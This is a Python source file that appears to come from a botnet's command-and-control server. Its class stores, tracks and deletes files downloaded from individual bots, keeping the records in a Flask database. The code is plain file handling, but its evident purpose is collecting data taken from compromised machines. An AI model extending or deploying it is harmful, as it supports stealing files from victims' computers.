from server.flaskdb import db

from threading import RLock
import os
import uuid


class BotNetFileManager:
    FILENAME_OBJFILE = 'filenames.json'

    # TODO: change to separate locks for each file
    def __init__(self,outputdir):
        '''
        Contains internal json object, doesn't need to update file for current bytes,
        only for names, close, and maxbytes
        :param outputdir: directory for storing downloads
        '''
        self.fileobjs = {}
        self.lock = RLock()
        self.outputdir = outputdir
        if not os.path.exists(self.outputdir):
            os.makedirs(self.outputdir)

    def checkDatabase(self):
        '''
        Checks database for missing files. Removes entries corresponding to
        those nonexistent entities.
        '''
        with self.lock:
            entries = FilenameEntry.query.all()
            for entry in entries:
                if not os.path.exists(entry.real_filename):
                    db.session.delete(entry)
            db.session.commit()

    def fileIsDownloading(self, user, filename):
        '''
        Returns if it appears a file is in the process of being downloaded from
        a bot
        :param user: username of bot
        :param filename: file being downloaded
        :return: True/False
        '''
        uf = (user,filename)
        with self.lock:
            if uf in self.fileobjs:
                return not self.fileobjs[uf].closed
            return False

    def fileIsDownloaded(self, user, filename):
        '''
        Returns if the file is on the server and not currently being downloaded
        :param user: username of bot
        :param filename: file being downloaded
        :return: True/False
        '''
        uf = (user, filename)
        with self.lock:
            if uf in self.fileobjs:
                return self.fileobjs[uf].closed
            else:
                entry = FilenameEntry.query.filter_by(user=user,remote_filename=filename).first()
                return entry is not None

    def appendBytesToFile(self, user, filename, wbytes):
        '''
        Adds bytes to a local file, creates new file if needed and adds item to db
        :param user: username of bot
        :param filename: filename being downloaded
        :param wbytes: bytes to append
        '''
        uf = (user, filename)
        with self.lock:
            entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
            print(entry)
            # If this file is not in the database create an entry
            if entry is None:
                real_filename = os.path.join(self.outputdir, str(uuid.uuid4()))
                while os.path.exists(real_filename):
                    real_filename = os.path.join(self.outputdir, str(uuid.uuid4()))
                entry = FilenameEntry(user, filename, real_filename, startcurrsize=len(wbytes))
                db.session.add(entry)
            # If the file is in the database, change its stats
            else:
                real_filename = entry.real_filename

            # If the file object hasn't been made, make it
            if uf not in self.fileobjs:
                entry.curr_size = 0
                self.fileobjs[uf] = open(real_filename, "wb")
            if not self.fileobjs[uf].closed:
                entry.curr_size += len(wbytes)
                self.fileobjs[uf].write(wbytes)

            db.session.commit()

    def closeFile(self, user, filename):
        '''
        Close a file, ceasing download
        :param user: username of bot
        :param filename: filename being downloaded
        '''
        uf = (user, filename)
        with self.lock:
            if uf in self.fileobjs:
                if not self.fileobjs[uf].closed:
                    self.fileobjs[uf].close()
                self.fileobjs.pop(uf)

    def setFileSize(self, user, filename, filesize):
        '''
        Sets the maximum size of file
        :param user: username
        :param filename: filename
        :param filesize: maximum size of file
        '''
        uf = (user, filename)
        with self.lock:
            entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
            if entry is None:
                real_filename = os.path.join(self.outputdir, str(uuid.uuid4()))
                while os.path.exists(real_filename):
                    real_filename = os.path.join(self.outputdir, str(uuid.uuid4()))
                entry = FilenameEntry(user, filename, real_filename, 0, filesize)
                db.session.add(entry)
            else:
                entry.max_size = filesize
                real_filename = entry.real_filename

            if uf not in self.fileobjs:
                entry.curr_size = 0
                self.fileobjs[uf] = open(real_filename, "wb")

            db.session.commit()


    def getFilesAndInfo(self):
        '''
        Creates a list of fileinfo objects with {user, filename, size, downloaded}
        :return: dict(user=user,filename=filename,size=size,downloaded=downloaded) for each
        '''
        # Get (user,file) list
        with self.lock:
            allfiles = FilenameEntry.query.all()
            fileinfo = []
            for fileentry in allfiles:
                user = fileentry.user
                filename = fileentry.remote_filename
                downloaded = fileentry.curr_size
                size = fileentry.max_size
                fileinfo.append(dict(user=user,filename=filename,size=size,downloaded=downloaded))
            return fileinfo

    def getFileName(self, user, filename):
        '''
        Gets the local filename associated with the remote file
        :param user: username of bot
        :param filename: remote filename
        :return: local filename or None
        '''
        uf = (user, filename)
        with self.lock:
            entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
            if entry is not None:
                return entry.real_filename
            return None

    def deleteFile(self, user, filename):
        '''
        Removes local copy of remote file. Ceases download if needed.
        :param user: username of bot
        :param filename: remote filename
        :return: True/False success
        '''
        uf = (user, filename)
        with self.lock:
            print("[*] Deleting {}:{}".format(user,filename))
            entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
            if entry is not None:
                if uf in self.fileobjs:
                    self.fileobjs[uf].close()
                real_filename = entry.real_filename
                try:
                    db.session.delete(entry)
                    db.session.commit()
                    os.remove(real_filename)
                except Exception as e:
                    print(e)
                return True
            return False


class FilenameEntry(db.Model):
    __tablename__ = "Files"

    user = db.Column(db.String(40))
    remote_filename = db.Column(db.String(120))
    real_filename = db.Column(db.String(120), unique=True, primary_key=True)
    curr_size = db.Column(db.Integer)
    max_size = db.Column(db.Integer)

    def __init__(self,user,remote_filename,real_filename,startcurrsize=0,startmaxsize=0):
        self.user = user
        self.remote_filename = remote_filename
        self.real_filename = real_filename
        self.curr_size = startcurrsize
        self.max_size = startmaxsize

    def __repr__(self):
        if self.curr_size != self.max_size:
            return "<{}:{}@{} [{}/{}]>".format(self.user,os.path.basename(self.remote_filename),
                                               os.path.basename(self.real_filename),
                                               str(self.curr_size),str(self.max_size))
        else:
            return "<{}:{}@{}>".format(self.user,os.path.basename(self.remote_filename),
                                       os.path.basename(self.real_filename))

    def __str__(self):
        return self.__repr__()